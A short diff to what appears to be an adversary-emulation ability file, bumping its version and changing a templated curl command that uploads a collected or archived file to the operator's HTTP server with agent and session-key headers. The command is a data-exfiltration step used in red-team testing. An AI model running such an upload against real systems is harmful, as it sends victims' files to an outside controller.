@@ -1,6 +1,6 @@
 id: c2ae6235-6d16-4f8b-ae4b-642a8ab9ee50
 metadata:
-  version: 2
+  version: 3
   authors:
     - privateducky
   tags:
@@ -17,4 +17,4 @@ platforms:
   global:
     sh:
       command: |
-        curl #{operator.http} --upload-file #{file.T1005} -H "agent:#{agent.name}" -H "key:#{operator.session}" --max-time 10; echo 'Complete';
+        curl #{operator.http} --upload-file #{file.T1560.001} -H "agent:#{agent.name}" -H "key:#{operator.session}" --max-time 10; echo 'Complete';
